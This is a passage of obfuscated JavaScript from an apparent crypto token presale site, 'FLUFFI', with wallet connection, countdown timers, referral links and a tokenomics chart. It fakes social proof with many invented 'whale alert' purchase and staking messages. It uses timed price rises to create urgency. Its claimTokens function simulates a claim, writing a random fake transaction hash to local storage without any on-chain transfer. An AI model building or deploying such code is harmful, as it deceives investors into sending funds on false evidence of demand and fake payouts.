x20User\x200xb3c...4d5\x20just\x20bought\x201.2\x20ETH\x20worth\x20of\x20FLUFFI','💳\x20Card\x20Payment','function','#staking\x20.bg-white\x5c/20','notification-toast','\x20<span\x20class=\x22price-tooltip\x22><i\x20class=\x22fas\x20fa-info-circle\x20text-blue-500\x22></i><span\x20class=\x22tooltip-text\x22><strong>Price\x20Increase:</strong><br>+5%\x20per\x20stage\x20(48\x20hours)<br>Next\x20increase:\x20<span\x20id=\x22nextIncreaseTime\x22>','🎯\x20User\x200xehi1...2j3\x20earned\x2015%\x20bonus\x20from\x20team\x20referrals!','How\x20to\x20Connect\x20MetaMask','Using\x20cached\x20','🐋\x20User\x200xn4o...5p6\x20just\x20invested\x201.75\x20ETH\x20in\x20FLUFFI','symbol','🐋\x20WHALE\x20ALERT!\x20User\x200xovz1...2a3\x20purchased\x2022.6\x20BNB\x20of\x20FLUFFI','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22this.parentElement.parentElement.remove()\x22\x20class=\x22w-full\x20bg-green-500\x20hover:bg-green-600\x20text-white\x20py-3\x20px-6\x20rounded-lg\x20font-semibold\x20text-lg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Awesome!\x20🚀\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','raised','\x20remaining','_blank','getCode','Please\x20connect\x20your\x20wallet\x20first','🔥\x20User0x29D\x20staked\x2025,000\x20FLUFFI\x20and\x20is\x20compounding\x20daily!','getNetwork','🐋\x20User\x200xiv5...6y7\x20just\x20invested\x20275\x20AVAX\x20in\x20FLUFFI','length','width','TokensStaked','https://mainnet.infura.io/v3/','max','buy','referralLinkInput','totalRaised','https://rpc-amoy.polygon.technology','Failed\x20to\x20switch\x20to\x20','SOL','join','click','classList','\x0a\x20\x20\x20\x20<button\x20id=\x22walletButton\x22\x20class=\x22bg-green-700\x20hover:bg-green-800\x20text-white\x20py-1\x20px-3\x20rounded\x20flex\x20items-center\x22>\x0a\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-wallet\x20mr-2\x22></i>Connect\x20Wallet\x0a\x20\x20\x20\x20</button>\x0a\x20\x20','href','ETH','SystemProgram','🎯\x20User0xD88\x20invited\x20a\x20friend\x20and\x20earned\x2010%\x20referral\x20bonus','🐋\x20WHALE\x20ALERT!\x20User\x200xmtw5...6x7\x20invested\x2014.8\x20BNB\x20in\x20FLUFFI','Parse\x20error:','name','...','\x0a\x20\x20\x20\x20\x20\x20<div\x20style=\x22text-align:\x20center;\x20padding:\x2020px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:\x2016px;\x20margin-bottom:\x2010px;\x22>🔗\x20WalletConnect</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20style=\x22font-size:\x2014px;\x20color:\x20#6b7280;\x20margin-bottom:\x2015px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Open\x20your\x20wallet\x20app\x20and\x20scan\x20QR\x20code\x20or\x20use\x20the\x20links\x20below:\x0a\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22display:\x20flex;\x20flex-direction:\x20column;\x20gap:\x2010px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22window.open(\x27https://metamask.app.link/wc?uri=','🚀\x20User0xC11\x20joined\x20with\x200.75\x20ETH\x20in\x20presale!','emergencyStopPresale','🐋\x20User0x6C2\x20just\x20bought\x209.9\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','Please\x20select\x20a\x20valid\x20network\x20and\x20currency.','Please\x20approve\x20in\x20Phantom...','SOLUSDT','isPhantom','🚀\x20User0x3FE\x20joined\x20with\x200.65\x20ETH\x20in\x20presale!','update','bg-red-500','🚀\x20User\x200xbd0...1e2\x20joined\x20with\x2015.7\x20BNB\x20in\x20presale!','application/json','Using\x20fallback\x20price\x20for\x20','isMetaMask','balance_','🔥\x20User0x63B\x20staked\x2015,000\x20FLUFFI\x20early\x20on!','availableRewards','\x20price:','staker','Referral\x20link\x20copied\x20to\x20clipboard!','Wallet\x20connection\x20error:','opacity-50','https://bsc-dataseed.binance.org/','titleColor','attempts','?ref=','execCommand','🔥\x20User\x200xqj9...0k1\x20locked\x2078,300\x20FLUFFI\x20in\x20staking\x20pool','💰\x20User\x200xhmn0...1o2\x20earned\x2025,000\x20FLUFFI\x20from\x20referrals','Binance\x20Smart\x20Chain\x20Testnet','Failed\x20to\x20add\x20','How\x20to\x20Connect\x20Phantom\x20Wallet','\x20SOL','confirmed','isConnected','🚀\x20User0x77C\x20joined\x20with\x200.8\x20ETH\x20in\x20presale!','Please\x20install\x20a\x20Web3\x20wallet\x20like\x20MetaMask\x20to\x20switch\x20networks','https://etherscan.io','toFixed','walletConnectModal','🎯\x20User0x92E\x20invited\x205\x20friends\x20and\x20earned\x2050%\x20referral\x20bonus','🐾\x20User0x34C\x20bought\x2040,000\x20FLUFFI\x20tokens','all','Avalanche\x20Mainnet','log','\x20($','\x20price:\x20$','Ethereum\x20Sepolia','parseEther','selected\x20network','POL','params','devSection','https://link.trustwallet.com/open_url?coin=60&url=','💰\x20User\x200xph6...7i8\x20staked\x20120,500\x20FLUFFI\x20for\x20huge\x20rewards!','🚀\x20User0x18C\x20joined\x20with\x202\x20ETH\x20in\x20presale!','transfer','Network\x20not\x20supported:','🚀\x20User0x44D\x20joined\x20with\x203\x20ETH\x20in\x20presale!','10,215','🎯\x20User0x66F\x20invited\x202\x20friends\x20and\x20earned\x2020%\x20referral\x20bonus','div','🔥\x20User\x200xu4v...5w6\x20bought\x206.3\x20AVAX\x20worth\x20of\x20FLUFFI\x20tokens','🐋\x20User\x200xmd7...8e9\x20just\x20bought\x2042.3\x20AVAX\x20of\x20FLUFFI','error','_presaleDurationHours','Connection\x20failed:\x20','labels','REFERRAL_PERCENT','button[onclick=\x22claimTokens()\x22]','Error\x20switching\x20network:','🐋\x20User0x12A\x20just\x20bought\x201.2\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','pathname','matches','noopener,noreferrer','startTime','smooth','🎯\x20User0xACD\x20invited\x203\x20friends\x20and\x20earned\x2030%\x20referral\x20bonus','toggle','\x20-\x20','then','dev=true','🐋\x20User0x82A\x20just\x20bought\x200.5\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','🐋\x20User0xE91\x20just\x20bought\x203.5\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','🔥\x20User\x200xup1...2q3\x20staked\x2034,200\x20FLUFFI\x20early\x20on!','signAndSendTransaction','eth_accounts','referrer','Sending\x20','feedMessage','address[]','Contract','No\x20tokens\x20available\x20to\x20claim','Failed\x20to\x20switch\x20network','now','\x20text-white\x20px-6\x20py-4\x20rounded-lg\x20shadow-xl\x20flex\x20items-center\x20space-x-3\x20max-w-md\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22text-2xl\x22>','\x27Segoe\x20UI\x27,\x20Tahoma,\x20Geneva,\x20Verdana,\x20sans-serif','🚀\x20User\x200xa2b...3c4\x20joined\x20with\x200.8\x20AVAX\x20in\x20presale!','How\x20to\x20Connect\x20Trust\x20Wallet','Transaction','https://metamask.app.link/dapp/','ReferralRewardClaimed','Network\x20changed\x20to:\x20','fixed\x20top-1/2\x20left-1/2\x20transform\x20-translate-x-1/2\x20-translate-y-1/2\x20z-50\x20bg-white\x20dark:bg-gray-800\x20p-8\x20rounded-2xl\x20shadow-2xl\x20max-w-md\x20w-full\x20border-4\x20border-green-500','stopPropagation'];_0x7557=function(){return _0x45ef7f;};return _0x7557();}function updateStakingCountdown(){const _0x50fa05=_0x1bf7bf,_0x2a7c7f=getPresaleEndTime(),_0x367976=Date[_0x50fa05(0x1fb)](),_0x659c6=_0x2a7c7f-_0x367976;if(_0x659c6<0x0){document[_0x50fa05(0x238)](_0x50fa05(0x86))[_0x50fa05(0x209)]=_0x50fa05(0x2e9);return;}const _0x504e07=Math['floor'](_0x659c6/(0x3e8*0x3c*0x3c*0x18)),_0x42d931=Math[_0x50fa05(0x28f)](_0x659c6%(0x3e8*0x3c*0x3c*0x18)/(0x3e8*0x3c*0x3c)),_0x47476e='\x0a\x20\x20\x20\x20<div\x20class=\x22flex\x20gap-4\x20justify-center\x20text-white\x22>\x0a\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-3xl\x20font-bold\x22>'+_0x504e07+_0x50fa05(0x252)+_0x42d931+_0x50fa05(0x7d);document[_0x50fa05(0x238)](_0x50fa05(0x173))[_0x50fa05(0x209)]=_0x50fa05(0x133)+_0x47476e+_0x50fa05(0xc6);}setInterval(updateStakingCountdown,0xea60),updateStakingCountdown();async function claimTokens(){const _0x3d1759=_0x1bf7bf;try{if(!userWalletAddress){showNotification(_0x3d1759(0x181),_0x3d1759(0x1dd)),openWalletModal();return;}const _0x206fa4=getPresaleEndTime(),_0x5dad29=Date[_0x3d1759(0x1fb)]();if(_0x5dad29<_0x206fa4){const _0x57e2a6=formatTime(_0x206fa4-_0x5dad29);showNotification(_0x3d1759(0x246)+_0x57e2a6['full']+_0x3d1759(0x17e),_0x3d1759(0x78));return;}const _0x30b0e4=JSON[_0x3d1759(0x25d)](localStorage[_0x3d1759(0x297)](_0x3d1759(0x8e)+userWalletAddress)||'[]'),_0x2fe8d0=JSON[_0x3d1759(0x25d)](localStorage[_0x3d1759(0x297)](_0x3d1759(0xb0)+userWalletAddress)||'[]'),_0x4e3055=_0x30b0e4[_0x3d1759(0x111)]((_0x3c35ee,_0x500bdd)=>_0x3c35ee+_0x500bdd[_0x3d1759(0x227)],0x0),_0x1b3c61=_0x2fe8d0[_0x3d1759(0x111)]((_0x36dfea,_0x1d5ef5)=>_0x36dfea+_0x1d5ef5[_0x3d1759(0x140)],0x0),_0x5d4e1a=_0x4e3055-_0x1b3c61;if(_0x5d4e1a<=0x0){showNotification(_0x3d1759(0x1f9),_0x3d1759(0x282));return;}const _0x157541=document[_0x3d1759(0x238)](_0x3d1759(0x1e2)),_0x4b0c1f=_0x157541[_0x3d1759(0x2db)];_0x157541[_0x3d1759(0x2f8)]=!![],_0x157541[_0x3d1759(0x209)]='<i\x20class=\x22fas\x20fa-spinner\x20fa-spin\x20mr-2\x22></i>\x20Claiming...';try{const _0x1115cf=new ethers[(_0x3d1759(0x280))][(_0x3d1759(0x271))](window['ethereum']),_0x1d0df6=_0x1115cf[_0x3d1759(0x27b)]();setTimeout(()=>{const _0x2808cc=_0x3d1759,_0x21c8d7={'amount':_0x5d4e1a,'timestamp':Date[_0x2808cc(0x1fb)](),'txHash':'0x'+Math['random']()[_0x2808cc(0x2d0)](0x10)[_0x2808cc(0x295)](0x2,0x40)};_0x2fe8d0[_0x2808cc(0x273)](_0x21c8d7),localStorage[_0x2808cc(0x91)]('claims_'+userWalletAddress,JSON['stringify'](_0x2fe8d0));const _0x39a3c8=parseFloat(localStorage['getItem']('balance_'+userWalletAddress)||'0');localStorage[_0x2808cc(0x91)](_0x2808cc(0x1ab)+userWalletAddress,(_0x39a3c8+_0x5d4e1a)[_0x2808cc(0x2d0)]()),_0x157541['disabled']=![],_0x157541[_0x2808cc(0x2db)]=_0x4b0c1f,updateUserBalances(),showNotification(_0x2808cc(0x2e8)+_0x5d4e1a['toFixed'](0x2)+_0x2808cc(0x9c),'success');},0xbb8);}catch(_0x1ac394){console['error']('Claim\x20error:',_0x1ac394),_0x157541[_0x3d1759(0x2f8)]=![],_0x157541['textContent']=_0x4b0c1f,showNotification(_0x3d1759(0xcc)+_0x1ac394[_0x3d1759(0xc5)],'error');}}catch(_0x4a3c8b){console[_0x3d1759(0x1dd)](_0x3d1759(0x2a7),_0x4a3c8b),showNotification(_0x4a3c8b[_0x3d1759(0xc5)]||_0x3d1759(0x135),_0x3d1759(0x1dd));}}function _0x38e3(_0xe4300b,_0x49968d){const _0x75576a=_0x7557();return _0x38e3=function(_0x38e3ee,_0x57dea5){_0x38e3ee=_0x38e3ee-0x78;let _0x1caa34=_0x75576a[_0x38e3ee];return _0x1caa34;},_0x38e3(_0xe4300b,_0x49968d);}function getPresaleEndTime(){const _0x38509e=getPresaleStartTime();return _0x38509e+0xf*0x30*0x3c*0x3c*0x3e8;}async function updateUserBalances(){const _0x5cae5f=_0x1bf7bf;if(!userWalletAddress)return;try{if(!isSolanaWallet&&window[_0x5cae5f(0xa2)]){const _0x66153=new ethers[(_0x5cae5f(0x280))][(_0x5cae5f(0x271))](window['ethereum']),_0x1d5e64=await _0x66153[_0x5cae5f(0x183)](),_0x28da48=CONTRACT_ADDRESSES[_0x1d5e64[_0x5cae5f(0x11e)]];if(_0x28da48&&!_0x28da48[_0x5cae5f(0x21a)]('...')){const _0x1d757e=new ethers[(_0x5cae5f(0x1f8))](_0x28da48,FLUFFI_CONTRACT_ABI,_0x66153),[_0x274ed7,_0x24aab2,_0x5d1927]=await Promise[_0x5cae5f(0x1c7)]([_0x1d757e[_0x5cae5f(0xf6)](userWalletAddress),_0x1d757e[_0x5cae5f(0x237)](userWalletAddress),_0x1d757e[_0x5cae5f(0x128)](userWalletAddress)]);document['getElementById']('userPresale')[_0x5cae5f(0x2db)]=ethers['utils'][_0x5cae5f(0x129)](_0x274ed7,0x12),document['getElementById'](_0x5cae5f(0x168))[_0x5cae5f(0x2db)]=ethers[_0x5cae5f(0xfd)][_0x5cae5f(0x129)](_0x24aab2,0x12),document[_0x5cae5f(0x26f)]('userRewards')[_0x5cae5f(0x2db)]=ethers[_0x5cae5f(0xfd)][_0x5cae5f(0x129)](_0x5d1927,0x12);}}else{if(isSolanaWallet){const _0x406cb9=parseFloat(localStorage[_0x5cae5f(0x297)](_0x5cae5f(0x2ae)+userWalletAddress)||'0');document[_0x5cae5f(0x26f)](_0x5cae5f(0xad))[_0x5cae5f(0x2db)]=_0x406cb9[_0x5cae5f(0xc8)](undefined,{'maximumFractionDigits':0x2});}}}catch(_0x5d8464){console['error'](_0x5cae5f(0xe2),_0x5d8464);const _0xfdc84a=parseFloat(localStorage[_0x5cae5f(0x297)](_0x5cae5f(0x2ae)+userWalletAddress)||'0');document[_0x5cae5f(0x26f)](_0x5cae5f(0xad))['textContent']=_0xfdc84a[_0x5cae5f(0xc8)](undefined,{'maximumFractionDigits':0x2});}}function toggleDarkMode(){const _0x5504fc=_0x1bf7bf,_0x129d31=document[_0x5504fc(0xe9)];_0x129d31['classList'][_0x5504fc(0x1eb)](_0x5504fc(0xd2)),localStorage[_0x5504fc(0x91)](_0x5504fc(0x234),_0x129d31['classList'][_0x5504fc(0xa8)](_0x5504fc(0xd2)));const _0x38999c=document[_0x5504fc(0x26f)](_0x5504fc(0x15b));_0x38999c[_0x5504fc(0x2db)]=_0x129d31[_0x5504fc(0x192)][_0x5504fc(0xa8)](_0x5504fc(0xd2))?'☀️':'🌙';if(tokenChart){const _0x179c88=_0x129d31[_0x5504fc(0x192)]['contains'](_0x5504fc(0xd2));tokenChart[_0x5504fc(0x9a)]['plugins']['legend'][_0x5504fc(0x1e0)][_0x5504fc(0xf8)]=_0x179c88?_0x5504fc(0x103):_0x5504fc(0xec),tokenChart[_0x5504fc(0x1a5)]();}}function initTokenChart(){const _0x285b80=_0x1bf7bf,_0x449917=document[_0x285b80(0x26f)](_0x285b80(0x2c0));if(!_0x449917)return;const _0x139cf5=document[_0x285b80(0xe9)]['classList']['contains'](_0x285b80(0xd2)),_0x2dc9f0={'labels':[_0x285b80(0x7e),'Liquidity\x20(30%)',_0x285b80(0xcb),_0x285b80(0x22c),'Team\x20(5%)'],'datasets':[{'data':[0x28,0x1e,0x14,0x5,0x5],'backgroundColor':['#10B981',_0x285b80(0x25c),_0x285b80(0x12b),_0x285b80(0x13b),'#8B5CF6'],'borderWidth':0x0,'hoverOffset':0xf}]},_0x5121fd={'type':'doughnut','data':_0x2dc9f0,'options':{'responsive':!![],'maintainAspectRatio':![],'cutout':'65%','plugins':{'legend':{'position':_0x285b80(0x157),'labels':{'color':_0x139cf5?_0x285b80(0xa6):'#1F2937','font':{'size':0xe,'family':_0x285b80(0x1fd)},'padding':0x14}},'tooltip':{'backgroundColor':_0x139cf5?_0x285b80(0x216):'rgba(255,\x20255,\x20255,\x200.9)','titleColor':_0x139cf5?_0x285b80(0x29f):_0x285b80(0xd7),'bodyColor':_0x139cf5?_0x285b80(0xa6):'#1F2937','titleFont':{'size':0x10,'weight':_0x285b80(0x2d1)},'bodyFont':{'size':0xe},'padding':0xf,'cornerRadius':0xc,'callbacks':{'label':function(_0x23c283){const _0x173f42=_0x285b80;return _0x23c283[_0x173f42(0x11b)][_0x173f42(0x298)]('\x20(')[0x0]+':\x20'+_0x23c283['parsed']+'%';}}}},'animation':{'animateScale':!![],'animateRotate':!![],'duration':0x7d0,'easing':'easeOutQuart'}}},_0x5068e1=new Chart(_0x449917,_0x5121fd),_0x4b4862=new MutationObserver(function(_0x387d64){const _0x2275f7=_0x285b80;_0x387d64[_0x2275f7(0x2f7)](function(_0x4fa28a){const _0x49b95c=_0x2275f7;if(_0x4fa28a[_0x49b95c(0xc0)]==='class'){const _0x1de800=document[_0x49b95c(0xe9)][_0x49b95c(0x192)][_0x49b95c(0xa8)](_0x49b95c(0xd2));_0x5068e1['options'][_0x49b95c(0x121)][_0x49b95c(0x113)][_0x49b95c(0x1e0)][_0x49b95c(0xf8)]=_0x1de800?'#E2E8F0':_0x49b95c(0x2dc),_0x5068e1[_0x49b95c(0x9a)][_0x49b95c(0x121)][_0x49b95c(0x218)][_0x49b95c(0x148)]=_0x1de800?_0x49b95c(0x216):_0x49b95c(0x10a),_0x5068e1[_0x49b95c(0x9a)]['plugins'][_0x49b95c(0x218)][_0x49b95c(0x1b4)]=_0x1de800?_0x49b95c(0x29f):_0x49b95c(0xd7),_0x5068e1[_0x49b95c(0x9a)][_0x49b95c(0x121)][_0x49b95c(0x218)][_0x49b95c(0x269)]=_0x1de800?_0x49b95c(0xa6):'#1F2937',_0x5068e1[_0x49b95c(0x1a5)]();}});});_0x4b4862[_0x285b80(0x2cd)](document['documentElement'],{'attributes':!![],'attributeFilter':[_0x285b80(0x154)]});}document[_0x1bf7bf(0x10b)](_0x1bf7bf(0xdd),function(){initTokenChart();});function getPresaleStartTime(){const _0x30b701=_0x1bf7bf,_0x14e04d=new Date(_0x30b701(0x15e))['getTime']();return _0x14e04d;}function formatTime(_0x1e5c13){const _0x2e422a=_0x1bf7bf,_0xce1e86=Math[_0x2e422a(0x28f)](_0x1e5c13/(0x18*0xe10*0x3e8)),_0x5942d2=Math[_0x2e422a(0x28f)](_0x1e5c13%(0x18*0xe10*0x3e8)/(0xe10*0x3e8)),_0x2476f1=Math[_0x2e422a(0x28f)](_0x1e5c13%(0xe10*0x3e8)/(0x3c*0x3e8)),_0xfa614f=Math[_0x2e422a(0x28f)](_0x1e5c13%(0x3c*0x3e8)/0x3e8);return{'days':_0xce1e86[_0x2e422a(0x2d0)]()['padStart'](0x2,'0'),'hours':_0x5942d2[_0x2e422a(0x2d0)]()[_0x2e422a(0xbe)](0x2,'0'),'minutes':_0x2476f1[_0x2e422a(0x2d0)]()[_0x2e422a(0xbe)](0x2,'0'),'seconds':_0xfa614f['toString']()[_0x2e422a(0xbe)](0x2,'0'),'full':_0xce1e86+'d\x20'+_0x5942d2+'h\x20'+_0x2476f1+'m\x20'+_0xfa614f+'s'};}function updateNextIncreaseTime(){const _0x46406c=_0x1bf7bf,_0x5b0d32=Date['now'](),_0x3c8ab6=getPresaleStartTime(),_0x5319c0=Math[_0x46406c(0x28f)]((_0x5b0d32-_0x3c8ab6)/(0x18*0xe10*0x3e8)),_0x1664d9=_0x3c8ab6+(_0x5319c0+0x1)*0x18*0xe10*0x3e8,_0x423855=Math[_0x46406c(0x189)](0x0,_0x1664d9-_0x5b0d32),_0x37a5f8=formatTime(_0x423855);document[_0x46406c(0x26f)]('nextIncreaseTime')['textContent']=_0x37a5f8[_0x46406c(0x8c)];}function updateTimers(){const _0x454add=_0x1bf7bf,_0x40aeb9=Date[_0x454add(0x1fb)](),_0x44f87a=getPresaleStartTime(),_0x15a19e=_0x44f87a+0x1e*0x18*0xe10*0x3e8,_0x270866=Math[_0x454add(0x189)](0x0,_0x15a19e-_0x40aeb9),_0x38ef73=Math[_0x454add(0x284)](Math[_0x454add(0x28f)]((_0x40aeb9-_0x44f87a)/(0x18*0xe10*0x3e8)),0x1d),_0x2bbdf3=_0x44f87a+(_0x38ef73+0x1)*0x18*0xe10*0x3e8,_0x347820=Math[_0x454add(0x189)](0x0,_0x2bbdf3-_0x40aeb9),_0x324014=0x1-_0x347820/(0x18*0xe10*0x3e8);document['getElementById']('current-stage')[_0x454add(0x2db)]=_0x38ef73+0x1,document[_0x454add(0x26f)]('stageProgressBar')[_0x454add(0x2c2)][_0x454add(0x186)]=(_0x38ef73+_0x324014)/0x1e*0x64+'%';const _0x58749d=(0.0001*Math[_0x454add(0x13c)](1.05,_0x38ef73))[_0x454add(0x1c3)](0x6);document['getElementById'](_0x454add(0xf2))['innerHTML']=_0x58749d+_0x454add(0x212);if(_0x270866<=0x0)document[_0x454add(0x26f)](_0x454add(0xa7))[_0x454add(0x209)]='🎉\x20Presale\x20Ended!',document[_0x454add(0x26f)](_0x454add(0xe4))[_0x454add(0x2db)]=_0x454add(0x2f2);else{const _0x1b3cff=formatTime(_0x270866),_0x4ed693=formatTime(_0x347820);document[_0x454add(0x26f)](_0x454add(0x296))[_0x454add(0x2db)]=_0x1b3cff[_0x454add(0x22e)],document[_0x454add(0x26f)](_0x454add(0x240))['textContent']=_0x1b3cff[_0x454add(0x2a4)],document[_0x454add(0x26f)](_0x454add(0x16b))[_0x454add(0x2db)]=_0x1b3cff[_0x454add(0xed)],document[_0x454add(0x26f)](_0x454add(0x28e))[_0x454add(0x2db)]=_0x1b3cff['seconds'],document[_0x454add(0x26f)](_0x454add(0xe4))[_0x454add(0x2db)]=_0x4ed693[_0x454add(0x8c)];}}function initTimer(){updateTimers(),updateNextIncreaseTime(),setInterval(()=>{updateTimers(),updateNextIncreaseTime();},0x3e8);}document[_0x1bf7bf(0x10b)]('DOMContentLoaded',function(){const _0x34cc6b=_0x1bf7bf;localStorage['getItem'](_0x34cc6b(0x234))===_0x34cc6b(0xf1)||localStorage[_0x34cc6b(0x297)](_0x34cc6b(0x234))===null&&window[_0x34cc6b(0x277)](_0x34cc6b(0x2c6))[_0x34cc6b(0x1e6)]?(document['documentElement'][_0x34cc6b(0x192)][_0x34cc6b(0xd5)](_0x34cc6b(0xd2)),document[_0x34cc6b(0x26f)](_0x34cc6b(0x15b))[_0x34cc6b(0x2db)]='☀️'):(document['documentElement'][_0x34cc6b(0x192)][_0x34cc6b(0xaa)](_0x34cc6b(0xd2)),document[_0x34cc6b(0x26f)](_0x34cc6b(0x15b))[_0x34cc6b(0x2db)]='🌙'),window[_0x34cc6b(0xa2)]?.['isMetaMask']&&document[_0x34cc6b(0x26f)]('metamaskInstalledBadge')[_0x34cc6b(0x192)]['remove'](_0x34cc6b(0xca)),initTokenChart(),initTimer(),checkReferral();});function toggleDarkMode(){const _0x2d569e=_0x1bf7bf,_0x5764e7=document[_0x2d569e(0xe9)];_0x5764e7[_0x2d569e(0x192)][_0x2d569e(0x1eb)](_0x2d569e(0xd2)),localStorage['setItem'](_0x2d569e(0x234),_0x5764e7['classList']['contains'](_0x2d569e(0xd2)));const _0x4c0fc7=document['getElementById']('darkModeIcon');_0x4c0fc7[_0x2d569e(0x2db)]=_0x5764e7[_0x2d569e(0x192)][_0x2d569e(0xa8)](_0x2d569e(0xd2))?'☀️':'🌙';if(tokenChart){const _0x18910a=_0x5764e7[_0x2d569e(0x192)]['contains'](_0x2d569e(0xd2));tokenChart[_0x2d569e(0x9a)]['plugins']['legend']['labels'][_0x2d569e(0xf8)]=_0x18910a?_0x2d569e(0x103):_0x2d569e(0xec),tokenChart['update']();}}function checkReferral(){const _0x2d1534=_0x1bf7bf,_0x449fad=new URLSearchParams(window[_0x2d1534(0x123)]['search']),_0x49cdf3=_0x449fad[_0x2d1534(0x299)](_0x2d1534(0xdb));_0x49cdf3&&/^0x[0-9a-fA-F]{40}$/[_0x2d1534(0x139)](_0x49cdf3)&&(document[_0x2d1534(0x26f)](_0x2d1534(0x2c7))[_0x2d1534(0x258)]=_0x49cdf3);}async function connectReferralWallet(){!userWalletAddress&&await connectWallet(),userWalletAddress&&showReferralUI(userWalletAddress);}function showReferralUI(_0x527849){const _0x10c383=_0x1bf7bf,_0x2453a0=window['location'][_0x10c383(0x194)]['split']('?')[0x0]+_0x10c383(0x1b6)+_0x527849,_0x5b6c54=JSON['parse'](localStorage[_0x10c383(0x297)](_0x10c383(0x166)+_0x527849)||'[]'),_0x3136f9=_0x5b6c54[_0x10c383(0x185)],_0x88de28=_0x5b6c54[_0x10c383(0x111)]((_0xfc6af1,_0x3d70e9)=>_0xfc6af1+parseFloat(_0x3d70e9[_0x10c383(0x140)])*0.1,0x0);document['getElementById'](_0x10c383(0x21c))[_0x10c383(0x209)]=_0x10c383(0x2ad)+_0x2453a0+_0x10c383(0xea)+_0x3136f9+_0x10c383(0x8a)+_0x88de28['toFixed'](0x4)+_0x10c383(0xb9);}function copyReferralLink(){const _0x258e50=_0x1bf7bf,_0x43e62b=document[_0x258e50(0x26f)](_0x258e50(0x18b));_0x43e62b['select'](),document[_0x258e50(0x1b7)](_0x258e50(0x225)),alert(_0x258e50(0x1b0));}function shareOnTwitter(){const _0x5e00ed=_0x1bf7bf,_0x3c2b26=document['getElementById'](_0x5e00ed(0x18b))[_0x5e00ed(0x258)];window['open'](_0x5e00ed(0x2bb)+encodeURIComponent(_0x3c2b26)+_0x5e00ed(0x85),'_blank',_0x5e00ed(0x1e7));}function shareOnTelegram(){const _0x50cdb7=_0x1bf7bf,_0x4733f7=document['getElementById'](_0x50cdb7(0x18b))[_0x50cdb7(0x258)];window[_0x50cdb7(0x21f)](_0x50cdb7(0xd8)+encodeURIComponent(_0x4733f7)+_0x50cdb7(0x253),_0x50cdb7(0x17f),_0x50cdb7(0x1e7));}const NETWORKS={'56':{'chainId':_0x1bf7bf(0x9e),'chainName':_0x1bf7bf(0x99),'rpcUrl':_0x1bf7bf(0x1b3),'nativeCurrency':{'name':_0x1bf7bf(0x138),'symbol':_0x1bf7bf(0x138),'decimals':0x12},'blockExplorerUrl':'https://bscscan.com'},'1':{'chainId':'0x1','chainName':_0x1bf7bf(0x2be),'rpcUrl':_0x1bf7bf(0x188),'nativeCurrency':{'name':_0x1bf7bf(0x195),'symbol':_0x1bf7bf(0x195),'decimals':0x12},'blockExplorerUrl':_0x1bf7bf(0x1c2)},'43114':{'chainId':_0x1bf7bf(0xb4),'chainName':'Avalanche\x20Mainnet','rpcUrl':'https://api.avax.network/ext/bc/C/rpc','nativeCurrency':{'name':_0x1bf7bf(0x125),'symbol':'AVAX','decimals':0x12},'blockExplorerUrl':_0x1bf7bf(0xde)}};document[_0x1bf7bf(0x10b)](_0x1bf7bf(0xdd),function(){const _0x2cca6f=_0x1bf7bf,_0x3ea1e9=document[_0x2cca6f(0x26f)](_0x2cca6f(0x141));_0x3ea1e9['addEventListener']('change',async function(){const _0x2ec80b=_0x2cca6f,_0x42606e=this[_0x2ec80b(0x258)],[_0x205076,_0xc9a2ff]=parseChainCurrency(_0x42606e);updateNetworkIndicator(_0x205076,_0xc9a2ff);if(userWalletAddress&&!_0x205076[_0x2ec80b(0x21a)](_0x2ec80b(0xc3))&&_0x205076!=='card')try{await ensureCorrectNetwork(_0x205076);}catch(_0x11c536){console['log'](_0x2ec80b(0xc4));}}),detectAndSetNetwork();});function updateNetworkIndicator(_0x4288f2,_0x4004bc){const _0x13fe92=_0x1bf7bf,_0x4081ac=document['getElementById'](_0x13fe92(0xf7))||createNetworkIndicator();let _0x117992='';if(_0x4288f2===_0x13fe92(0x122))_0x117992=_0x13fe92(0x171);else{if(_0x4288f2[_0x13fe92(0x21a)](_0x13fe92(0xc3)))_0x117992=_0x13fe92(0x150)+_0x4004bc;else{const _0x456f12=NETWORKS[_0x4288f2];_0x117992=_0x456f12?_0x456f12[_0x13fe92(0x2a2)]+_0x13fe92(0x1ec)+_0x4004bc:_0x13fe92(0x108)+_0x4288f2+'\x20-\x20'+_0x4004bc;}}_0x4081ac['textContent']=_0x117992;}async function detectAndSetNetwork(){const _0x15d66b=_0x1bf7bf;if(!window[_0x15d66b(0xa2)])return;try{const _0x1bc0cb=await window[_0x15d66b(0xa2)][_0x15d66b(0x90)]({'method':_0x15d66b(0x2b2)}),_0x1db011=parseInt(_0x1bc0cb,0x10)[_0x15d66b(0x2d0)](),_0x1fb80f=document[_0x15d66b(0x26f)](_0x15d66b(0x141)),_0x51eefd=_0x1fb80f[_0x15d66b(0x9a)];for(let _0x5f260c=0x0;_0x5f260c<_0x51eefd['length'];_0x5f260c++){const [_0x4dc5bd]=parseChainCurrency(_0x51eefd[_0x5f260c]['value']);if(_0x4dc5bd===_0x1db011){_0x1fb80f[_0x15d66b(0x275)]=_0x5f260c;const [,_0x4e3e55]=parseChainCurrency(_0x51eefd[_0x5f260c]['value']);updateNetworkIndicator(_0x4dc5bd,_0x4e3e55);break;}}}catch(_0x3542a8){console['error']('Error\x20detecting\x20network:',_0x3542a8);}}async function switchNetwork(_0x5e62d7){const 